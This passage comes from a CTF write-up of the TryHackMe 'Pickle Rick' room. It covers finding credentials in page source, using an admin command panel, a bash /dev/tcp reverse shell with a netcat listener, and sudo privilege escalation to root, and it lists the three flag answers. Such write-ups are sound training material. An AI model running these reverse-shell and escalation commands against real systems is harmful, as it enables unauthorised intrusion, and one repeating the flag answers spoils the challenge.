  ```
  
- Honestly this is the first time that `nikto` was actually usefull lol, it found login page. Beside that, in source code of main page you can find username.

  ```
    <!--

    Note to self, remember username!

    Username: R1ckRul3s

    -->
  ```
  
- In `robots.txt` I found `Wubbalubbadubdub` so I tried using that as SSH password but it didn't work. Since nikto actually did it's job for once I tried same credentials on admin login page. It worked!

---

## ‚öôÔ∏è Shell Access

- Now, here comes my favourite part, REVERSE SHELLS! OK, so in admin page you have option to run commands. Unfortunately, when you use `cat` it won't work, that's a sign to upload reverse shell.

  ```
  ls 

  Sup3rS3cretPickl3Ingred.txt
  assets
  clue.txt
  denied.php
  index.html
  login.php
  portal.php
  robots.txt
  
  cat Sup3rS3cretPickl3Ingred.txt
  Command disabled to make it hard for future PICKLEEEE RICCCKKKK.
  ```
  
- I tried php reverse shell first and it didn't work, but bash shell did. Start a listener and upload this one liner in admin panel.

  ```
  bash -c 'bash -i >& /dev/tcp/[YOUR-THM-IP]/4444 0>&1' 

  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.236.115] 50424
  bash: cannot set terminal process group (1033): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@ip-10-10-236-115:/var/www/html$ whoami
  whoami
  www-data
  ```
  
- Of course that I have to switch to my beloved putty shell, that's not even a question, let's go find those ingredients!

  ```
  python3 -c 'import pty,os,sys; pty.spawn("/bin/bash")'
  CTRL-Z
  stty raw -echo; fg
  export TERM=xterm
  ```

## üßç User Privilege Escalation

- Wellp, at first I started enumerating the machine with `find` and `grep` in order to get those files but that took soooooo long that I didn't even let it finish, so I started looking for them manually.
  
- First one is already there, just read it and second one is in `/home/rick`.

  ```
  www-data@ip-10-10-236-115:/var/www/html$ cat Sup3rS3cretPickl3Ingred.txt 
  mr. meeseek hair 
  
  www-data@ip-10-10-236-115:/var/www/html$ cat clue.txt 
  Look around the file system for the other ingredient.

  www-data@ip-10-10-236-115:/home/rick$ cat 'second ingredients' 
  1 jerry tear
  ```

---

## üëë Root Privilege Escalation

- After finding first two ingredients I had a feeling that third one is in root directory, so I ran `sudo -l` as always and guess what I found?

  ```
  www-data@ip-10-10-236-115:/home/ubuntu$ sudo -l
  Matching Defaults entries for www-data on ip-10-10-236-115:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User www-data may run the following commands on ip-10-10-236-115:
      (ALL) NOPASSWD: ALL
  ```
  
- YEP! We can use any sudo command without password. Just switch to root and read the last ingredient.

  ```
  www-data@ip-10-10-236-115:/$ sudo su
  root@ip-10-10-236-115:/# cd /root
  root@ip-10-10-236-115:~# ls -al
  total 36
  drwx------  4 root root 4096 Jul 11  2024 .
  drwxr-xr-x 23 root root 4096 May  9 18:46 ..
  -rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
  -rw-------  1 root root  168 Jul 11  2024 .bash_history
  -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
  -rw-r--r--  1 root root  161 Jan  2  2024 .profile
  drwxr-xr-x  4 root root 4096 Jul 11  2024 snap
  drwx------  2 root root 4096 Feb 10  2019 .ssh
  -rw-------  1 root root  702 Jul 11  2024 .viminfo
  root@ip-10-10-236-115:~# cat 3rd.txt 
  3rd ingredients: fleeb juice
  ```
  
- See ya in the next one, Wubbalubbadubdub! ü•í

## üèÅ Flags

- **What is the first ingredient that Rick needs?**: `mr. meeseek hair`
- **What is the second ingredient in Rick‚Äôs potion?**: `1 jerry tear`
- **What is the last and final ingredient?**: `fleeb juice`

## üí¨ Notes & Reflections

- What was challenging in this room for me?
  `Nothing really, I'm literally proud of nikto for doing it's job lol.`

- What did I learn?
  `To always try different things`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! ü§ü
